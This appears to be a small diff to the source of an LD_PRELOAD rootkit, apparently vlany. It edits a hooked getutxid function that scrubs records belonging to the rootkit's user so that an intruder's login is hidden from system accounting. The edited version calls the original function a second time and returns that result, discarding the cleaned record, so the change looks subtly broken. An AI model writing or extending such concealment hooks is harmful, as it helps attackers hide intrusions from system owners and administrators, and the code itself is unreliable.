@@ -6,8 +6,7 @@ struct utmpx *getutxid(const struct utmpx *utx)
 
     HOOK(old_getutxid, CGETUTXID);
 
-    struct utmpx *tmp;
-    tmp = old_getutxid(utx);
+    struct utmpx *tmp = old_getutxid(utx);
 
     if(tmp && tmp->ut_user != NULL)
     {
@@ -16,5 +15,5 @@ struct utmpx *getutxid(const struct utmpx *utx)
         CLEAN(vlany_user);
     }
 
-    return tmp;
+    return old_getutxid(utx);
 }
